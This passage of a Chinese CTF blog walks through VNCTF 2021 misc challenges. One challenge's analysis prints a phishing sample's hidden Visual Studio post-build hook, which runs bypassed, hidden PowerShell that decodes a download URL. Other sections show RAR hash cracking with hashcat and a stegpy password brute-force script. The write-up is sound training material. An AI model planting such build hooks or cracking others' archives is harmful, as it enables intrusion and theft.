class="line">plt.subplot(<span class="number">154</span>), plt.imshow(np.log(<span class="number">1</span>+np.<span class="built_in">abs</span>(img_c4)), <span class="string">&quot;gray&quot;</span>), plt.title(<span class="string">&quot;Decentralized&quot;</span>)</span><br><span class="line">plt.subplot(<span class="number">155</span>), plt.imshow(np.<span class="built_in">abs</span>(img_c5), <span class="string">&quot;gray&quot;</span>), plt.title(<span class="string">&quot;Processed Image&quot;</span>)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://butter.lumosary.workers.dev/images/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1615791254518.ee875b6adc065398766439b5aa1505fef9812122.png"></p><p>从图中可以看出 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VNCTF&#123;Ff5_1S_bEauTiful&#125;</span><br></pre></td></tr></table></figure><h3 id="interesting-fishing"><a href="#interesting-fishing" class="headerlink" title="interesting_fishing"></a>interesting_fishing</h3><p>下载附件后使用 010 editor 打开可以发现是一个邮件文件，继而可以找到其中保存的 base64 形式的附件。将附件使用 CyberChef 解码并保存下来，得到 myproject.rar 文件。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1615793051206.6feb265c4745c5cf9e28cc89ae332da9d585927f.png"></p><p>将压缩文件解压可以得到一个项目，在其 VS 配置文件中可以发现如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;PostBuildEvent&gt;</span><br><span class="line">&lt;Command&gt;powershell -exec bypass -w hi&quot;dd&quot;en -f x64\Debug\Browse.VC.db&lt;&#x2F;Command&gt;</span><br><span class="line">&lt;&#x2F;PostBuildEvent&gt;</span><br></pre></td></tr></table></figure><p>在压缩文件中对应路径下可以找到对应的 <code>Browse.VC.db</code> 文件，可以在压缩文件中直接打开，发现其中有如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$encodestring &#x3D; &quot;XAB1AC0ANgA1ADQAMwAyAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMgA0AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQANwA4AD8AXAB1AC0ANgA1ADQAOAA5AD8AXAB1AC0ANgA1ADQAOAA5AD8AXAB1AC0ANgA1ADQAMQA4AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMwA0AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA1AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAAzAD8AXAB1AC0ANgA1ADQAOAAxAD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAOAAyAD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA1AD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA0AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAwAD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMgA3AD8AXAB1AC0ANgA1ADQAMQA1AD8AXAB1AC0ANgA1ADQAMgAzAD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMQA5AD8AXAB1AC0ANgA1ADQAMwA2AD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA3AD8AXAB1AC0ANgA1ADQAOAA5AD8AXAB1AC0ANgA1ADQANQA2AD8AXAB1AC0ANgA1ADQAMQA1AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAMQA1AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA1AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMQA3AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMwA0AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA1AD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMwA2AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA3AD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMwA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQANQA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMwAyAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQANgAxAD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA1AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQANgA5AD8AXAB1AC0ANgA1ADQANQA3AD8AXAB1AC0ANgA1ADQANQAwAD8AXAB1AC0ANgA1ADQANgAzAD8AXAB1AC0ANgA1ADQANgA4AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQANwA5AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgA0AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgAyAD8A&quot;</span><br><span class="line">$bytes  &#x3D; [System.Convert]::FromBase64String($string);</span><br><span class="line">$decoded &#x3D; [System.Text.Encoding]::UTF8.GetString($bytes); </span><br><span class="line">echo $decoded</span><br></pre></td></tr></table></figure><p>使用 base64 解码后可得到格式类似于 <code>.u.-.6.5.4.3.2.?.</code> 的数据，推测其有点像 Unicode 字符编码，但是其为负数。写个脚本将其与 0xffff 做差得到正数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> numbers = [-<span class="number">65432</span>,-<span class="number">65420</span>,-<span class="number">65420</span>,-<span class="number">65424</span>,-<span class="number">65421</span>,-<span class="number">65478</span>,-<span class="number">65489</span>,-<span class="number">65489</span>,-<span class="number">65418</span>,-<span class="number">65426</span>,-<span class="number">65437</span>,-<span class="number">65420</span>,-<span class="number">65434</span>,-<span class="number">65491</span>,-<span class="number">65486</span>,-<span class="number">65487</span>,-<span class="number">65485</span>,-<span class="number">65491</span>,-<span class="number">65487</span>,-<span class="number">65486</span>,-<span class="number">65483</span>,-<span class="number">65481</span>,-<span class="number">65488</span>,-<span class="number">65482</span>,-<span class="number">65487</span>,-<span class="number">65487</span>,-<span class="number">65486</span>,-<span class="number">65485</span>,-<span class="number">65490</span>,-<span class="number">65437</span>,-<span class="number">65425</span>,-<span class="number">65421</span>,-<span class="number">65490</span>,-<span class="number">65439</span>,-<span class="number">65424</span>,-<span class="number">65491</span>,-<span class="number">65426</span>,-<span class="number">65439</span>,-<span class="number">65426</span>,-<span class="number">65430</span>,-<span class="number">65431</span>,-<span class="number">65426</span>,-<span class="number">65433</span>,-<span class="number">65490</span>,-<span class="number">65427</span>,-<span class="number">65415</span>,-<span class="number">65423</span>,-<span class="number">65437</span>,-<span class="number">65428</span>,-<span class="number">65425</span>,-<span class="number">65419</span>,-<span class="number">65436</span>,-<span class="number">65490</span>,-<span class="number">65437</span>,-<span class="number">65425</span>,-<span class="number">65427</span>,-<span class="number">65489</span>,-<span class="number">65456</span>,-<span class="number">65415</span>,-<span class="number">65425</span>,-<span class="number">65426</span>,-<span class="number">65433</span>,-<span class="number">65415</span>,-<span class="number">65439</span>,-<span class="number">65426</span>,-<span class="number">65433</span>,-<span class="number">65499</span>,-<span class="number">65486</span>,-<span class="number">65488</span>,-<span class="number">65421</span>,-<span class="number">65420</span>,-<span class="number">65425</span>,-<span class="number">65422</span>,-<span class="number">65435</span>,-<span class="number">65421</span>,-<span class="number">65499</span>,-<span class="number">65486</span>,-<span class="number">65488</span>,-<span class="number">65428</span>,-<span class="number">65425</span>,-<span class="number">65417</span>,-<span class="number">65499</span>,-<span class="number">65486</span>,-<span class="number">65488</span>,-<span class="number">65425</span>,-<span class="number">65426</span>,-<span class="number">65499</span>,-<span class="number">65486</span>,-<span class="number">65488</span>,-<span class="number">65434</span>,-<span class="number">65425</span>,-<span class="number">65422</span>,-<span class="number">65435</span>,-<span class="number">65431</span>,-<span class="number">65433</span>,-<span class="number">65426</span>,-<span class="number">65499</span>,-<span class="number">65486</span>,-<span class="number">65488</span>,-<span class="number">65433</span>,-<span class="number">65425</span>,-<span class="number">65425</span>,-<span class="number">65436</span>,-<span class="number">65421</span>,-<span class="number">65499</span>,-<span class="number">65486</span>,-<span class="number">65488</span>,-<span class="number">65439</span>,-<span class="number">65427</span>,-<span class="number">65431</span>,-<span class="number">65436</span>,-<span class="number">65499</span>,-<span class="number">65486</span>,-<span class="number">65488</span>,-<span class="number">65458</span>,-<span class="number">65425</span>,-<span class="number">65422</span>,-<span class="number">65420</span>,-<span class="number">65432</span>,-<span class="number">65499</span>,-<span class="number">65486</span>,-<span class="number">65488</span>,-<span class="number">65461</span>,-<span class="number">65425</span>,-<span class="number">65422</span>,-<span class="number">65435</span>,-<span class="number">65439</span>,-<span class="number">65426</span>,-<span class="number">65499</span>,-<span class="number">65486</span>,-<span class="number">65488</span>,-<span class="number">65469</span>,-<span class="number">65457</span>,-<span class="number">65450</span>,-<span class="number">65463</span>,-<span class="number">65468</span>,-<span class="number">65491</span>,-<span class="number">65487</span>,-<span class="number">65479</span>,-<span class="number">65499</span>,-<span class="number">65486</span>,-<span class="number">65488</span>,-<span class="number">65424</span>,-<span class="number">65439</span>,-<span class="number">65422</span>,-<span class="number">65439</span>,-<span class="number">65426</span>,-<span class="number">65425</span>,-<span class="number">65431</span>,-<span class="number">65439</span>,-<span class="number">65490</span>,-<span class="number">65422</span>,-<span class="number">65439</span>,-<span class="number">65422</span>];</span><br><span class="line"><span class="keyword">var</span> result = <span class="string">&quot;&quot;</span>; numbers.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">number</span>)</span>&#123; result += <span class="string">&quot;,&quot;</span> + (<span class="number">0xffff</span> + number + <span class="number">1</span>) &#125;);</span><br><span class="line">result;</span><br></pre></td></tr></table></figure><p>解码后可以得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;vnctf-213-1257061123.cos.ap-nanjing.myqcloud.com&#x2F;Pyongyang%20stores%20low%20on%20foreign%20goods%20amid%20North%20Korean%20COVID-19%20paranoia.rar</span><br></pre></td></tr></table></figure><p>将文件下载下来，发现需要解压密码，ARCHPR 爆破无果但给出的提示确实是四位数字。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">maskcode</span><br><span class="line">The password is: four digits</span><br></pre></td></tr></table></figure><p>因此尝试使用 rar2john 先得到密码的 hash，再使用 hashcat 爆破。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lenovo@LAPTOP-3E49IU3M&gt;F:\..\..\..\..\run$.\rar2john <span class="string">&#x27;..\..\interesting_fishing\Pyongyang stores low on foreign goods amid North Korean COVID-19 paranoia.rar&#x27;</span></span><br><span class="line">..\..\interesting_fishing\Pyongyang stores low on foreign goods amid North Korean COVID-19 paranoia.rar:$rar5$16$1349cb834c70bf27bb4e48bb3fbe6975$15$ca4a3bc58278b04d9fba4d7d52acb196$8<span class="variable">$56245cd11e4a1c2e</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.\hashcat64.exe -m 13000 -a 3 <span class="string">&#x27;$rar5$16$1349cb834c70bf27bb4e48bb3fbe6975$15$ca4a3bc58278b04d9fba4d7d52acb196$8$56245cd11e4a1c2e&#x27;</span> ?d?d?d?d</span><br><span class="line"></span><br><span class="line">$rar5$16$1349cb834c70bf27bb4e48bb3fbe6975$15$ca4a3bc58278b04d9fba4d7d52acb196$8<span class="variable">$56245cd11e4a1c2e</span>:9705</span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Type........: RAR5</span><br><span class="line">Hash.Target......: $rar5$16$1349cb834c70bf27bb4e48bb3fbe6975$15<span class="variable">$ca4a3b</span>...4a1c2e</span><br><span class="line">Time.Started.....: Mon Mar 15 18:10:13 2021 (2 secs)</span><br><span class="line">Time.Estimated...: Mon Mar 15 18:10:15 2021 (0 secs)</span><br><span class="line">Guess.Mask.......: ?d?d?d?d [4]</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.Dev.<span class="comment">#1.....:     2520 H/s (0.09ms) @ Accel:64 Loops:16 Thr:256 Vec:1</span></span><br><span class="line">Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts</span><br><span class="line">Progress.........: 5000/10000 (50.00%)</span><br><span class="line">Rejected.........: 0/5000 (0.00%)</span><br><span class="line">Restore.Point....: 0/1000 (0.00%)</span><br><span class="line">Candidates.<span class="comment">#1....: 9234 -&gt; 9764</span></span><br><span class="line">HWMon.Dev.<span class="comment">#1.....: Temp: 51c Util: 54% Core:1920MHz Mem:4001MHz Bus:16</span></span><br><span class="line"></span><br><span class="line">Started: Mon Mar 15 18:09:57 2021</span><br><span class="line">Stopped: Mon Mar 15 18:10:16 2021 </span><br></pre></td></tr></table></figure><p>很快拿到了压缩包的密码 9705。解压压缩包得到一个 Word 文档，将 Word 文档再次解包可得 hideinfo.xml。使用 010 Editor 将其打开可以发现一些奇怪的字符。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1615803400636.0d8b55b7447ad14d6f30637269fd0c6428474f38.png"></p><p>尝试零宽字符隐写可得如下内容。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1615803606250.f653397825f5d9fa37a87330626698e49c6997bb.png"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vnctf&#123;APT_1S_c0M1nG</span><br></pre></td></tr></table></figure><p>使用如下的 CyberChef receipe 对 E-mail 文件中的 base64 字符串做进一步分析，可以发现某一段文本中含有一个 img 标签。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;\\n&#39;&#125;,&#39;&#39;,true,false,true,false)</span><br><span class="line">From_Base64(&#39;A-Za-z0-9+&#x2F;&#x3D;&#39;,true)</span><br><span class="line">Decode_text(&#39;Simplified Chinese GB18030 (54936)&#39;)</span><br><span class="line">From_HTML_Entity()</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://vnctf-213-1257061123.cos.ap-nanjing.myqcloud.com/ThisIsSecret.jpg&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 770px; height: 256px;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;img_insert_161259102178605354633598710636&quot;</span> <span class="attr">modifysize</span>=<span class="string">&quot;51%&quot;</span> <span class="attr">diffpixels</span>=<span class="string">&quot;8px&quot;</span> <span class="attr">scalingmode</span>=<span class="string">&quot;zoom&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将图片下载下来，使用 OurSecret 解密可得一个文件。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1615804134781.c246f8a3e4bd92aed869ad0551c6aacc083d81d5.png"></p><p>将文件保存后打开得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_fr0m_l@z@RuS&#125;</span><br></pre></td></tr></table></figure><p>将两段 flag 拼接起来得到完整的 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vnctf&#123;APT_1S_c0M1nG_fr0m_l@z@RuS&#125;</span><br></pre></td></tr></table></figure><h3 id="Do-you-like-Rhythm-Doctor"><a href="#Do-you-like-Rhythm-Doctor" class="headerlink" title="Do_you_like_Rhythm_Doctor"></a>Do_you_like_Rhythm_Doctor</h3><blockquote><p>节奏医生关卡编辑器：<a href="https://giacomopc.itch.io/rdle">https://giacomopc.itch.io/rdle</a></p></blockquote><p>将下载下来的附件解压两次后可以得到 main.rdlevel 文件。使用编辑器打开可以得到一首曲子的谱面。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1615961631112.d6c3c591731797700ba3d3ebb03f4b8f3e16fcaf.png"></p><p>可以观察到有四条轨道，每一条轨道上的点有矩形或者波两种情况。将文件用记事本打开，使用 0 代替波（Wave），使用 1 代替矩形（Square）,可以得到如下数据。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">011001100110110001100001011001110110101100000000010101110011001100110001011000110110111100000000011011010110010101011111010101100010011000000000010011100101111101000011010101000100011000000000</span><br></pre></td></tr></table></figure><p>使用 CyberChef <code>From Binary</code> 解码可以大致看出 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1615961631500.eee7f758a8717893e909636767f97927bcecf1d8.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;W31come_V&amp;N_CTF&#125;</span><br></pre></td></tr></table></figure><h3 id="HAPPYNEWYEAR"><a href="#HAPPYNEWYEAR" class="headerlink" title="HAPPYNEWYEAR"></a>HAPPYNEWYEAR</h3><p>解压附件可以得到一张名为 password.png 的图片和另一个压缩文档。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1616034357867.98b20b19c2cbc00fa7cd71c82f862b1918462402.png"></p><p>将图片上的内容对照 Chinese Code 和 Sheikah Language 解码。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1616034412940.9dd49dbac3f4b2c532bddb9e2d1bcd18e195beea.png"><img src="https://butter.lumosary.workers.dev/images/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1616034402151.e733ecfdfa5bb70cf9b41fb84a353abb379a9c0c.png"></p><p>可以得到压缩包密码为 <code>f87840bdddcc01e4</code>。根据提示使用 stegpy 配合密码表爆破。因为 stegpy 默认是交互的，因此自己写一段代码来解密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> stegpy <span class="keyword">import</span> crypt</span><br><span class="line"><span class="keyword">from</span> stegpy.lsb <span class="keyword">import</span> HostElement, decode_message, check_magic_number</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HostElementA</span>(<span class="params">HostElement</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_message</span>(<span class="params">self, password=<span class="literal">None</span></span>):</span></span><br><span class="line">        msg = decode_message(self.data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> password:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                salt = <span class="built_in">bytes</span>(msg[:<span class="number">16</span>])</span><br><span class="line">                msg = crypt.decrypt_info(password, <span class="built_in">bytes</span>(msg[<span class="number">16</span>:]), salt)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        check_magic_number(msg)</span><br><span class="line">        msg_len = <span class="built_in">int</span>.from_bytes(<span class="built_in">bytes</span>(msg[<span class="number">6</span>:<span class="number">10</span>]), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        filename_len = <span class="built_in">int</span>.from_bytes(<span class="built_in">bytes</span>(msg[<span class="number">10</span>:<span class="number">11</span>]), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        start = filename_len + <span class="number">11</span></span><br><span class="line">        end = start + msg_len</span><br><span class="line">        text = <span class="built_in">bytes</span>(msg[start:end]).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(text)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span>(<span class="params">filePath, password</span>):</span></span><br><span class="line">    host_path = filePath</span><br><span class="line">    host = HostElementA(host_path)</span><br><span class="line">    password = password</span><br><span class="line">    <span class="keyword">return</span> host.read_message(password)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">passwords = file.read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> password <span class="keyword">in</span> passwords:</span><br><span class="line">    <span class="keyword">if</span> Decrypt(<span class="string">&quot;happynewyear.png&quot;</span>, password):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Found password &#123;&#125;&quot;</span>.<span class="built_in">format</span>(password))</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Tried password &#123;&#125;&quot;</span>.<span class="built_in">format</span>(password))</span><br></pre></td></tr></table></figure><p>使用一份弱密码表配合上述脚本爆破可得如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">VNCTF&#123;HappyNewY3a5&#125;</span><br><span class="line">[*] Found password tyinfo</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VNCTF&#123;HappyNewY3a5&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Ugra CTF Quals 2021</title>
      <link href="/zh-CN/posts/8c450337.html"/>
      <url>/zh-CN/posts/8c450337.html</url>
      
